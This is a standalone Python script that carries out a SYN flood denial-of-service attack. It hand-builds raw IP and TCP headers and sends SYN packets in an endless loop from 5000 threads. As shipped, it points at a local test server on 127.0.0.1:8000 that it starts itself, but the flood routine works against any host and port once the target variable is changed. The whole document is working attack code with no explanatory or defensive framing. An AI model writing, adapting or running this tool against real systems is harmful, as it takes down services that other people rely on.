#!/usr/bin/env python3
# FAST SYN FLOOD — RAW PACKETS
import socket
import struct
import random
import threading
import time
import os

# IP Header
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = msg[i] | (msg[i+1] << 8)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_packet(dst_ip, dst_port):
    # IP Header
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 40
    ip_id = random.randint(1000, 9000)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton("127.0.0.1")
    ip_daddr = socket.inet_aton(dst_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    # TCP Header
    tcp_source = random.randint(1024, 65535)
    tcp_seq = 0
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0

    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

    tcp_header = struct.pack('!HHLLBBHHH', tcp_source, dst_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    # Pseudo header for checksum
    src_addr = socket.inet_aton("127.0.0.1")
    dst_addr = socket.inet_aton(dst_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
    psh += tcp_header
    tcp_check = checksum(psh)

    tcp_header = struct.pack('!HHLLBBHHH', tcp_source, dst_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    return ip_header + tcp_header

# Flood function
def syn_flood(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    print(f"[+] SYN FLOOD → {target_ip}:{target_port}")
    count = 0
    while True:
        try:
            packet = create_packet(target_ip, target_port)
            s.sendto(packet, (target_ip, 0))
            count += 1
            if count % 1000 == 0:
                print(f"[+] {count} SYN packets sent")
        except:
            pass

# MAIN
if __name__ == "__main__":
    target = "127.0.0.1"
    port = 8000
    threads = 5000

    print(f"STARTING SYN FLOOD — {threads} THREADS")

    # Start test server
    os.system("python -m http.server 8000 &")
    time.sleep(2)

    # Launch flood
    for _ in range(threads):
        threading.Thread(target=syn_flood, args=(target, port), daemon=True).start()

    # Keep alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopped.")
